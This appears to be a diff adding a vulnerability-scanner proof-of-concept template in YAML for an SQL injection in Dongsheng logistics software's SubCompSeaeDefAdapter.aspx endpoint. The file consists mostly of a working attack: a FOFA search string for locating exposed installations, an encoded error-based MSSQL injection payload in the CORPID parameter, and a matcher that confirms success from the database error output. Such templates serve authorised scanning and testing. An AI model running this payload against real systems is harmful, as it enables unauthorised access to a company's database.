@@ -1,0 +1,15 @@
+id: poc-yaml-dongshengsoft-subcompseaedefadapter-aspx-sqli
+info:
+  name: 东胜物流软件 SubCompSeaeDefAdapter.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 东胜物流软件
+  fofa: body="FeeCodes/CompanysAdapter.aspx" || body="dongshengsoft"
+requests:
+- method: GET
+  path: /FeeCodes/SubCompSeaeDefAdapter.aspx?CORPID=%27+AND+4757+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%284757%3D4757%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29+AND+%27KJaG%27%3D%27KJaG
+  expression: "status_code == 500 && \ncontains(body,\"将 varchar 值\") &&\ncontains(body,\"\
+    qbzxq1qqbjq\") &&\ncontains(body,\"转换成数据类型 int 时失败\")\n"
+variables: {}
+transport: http
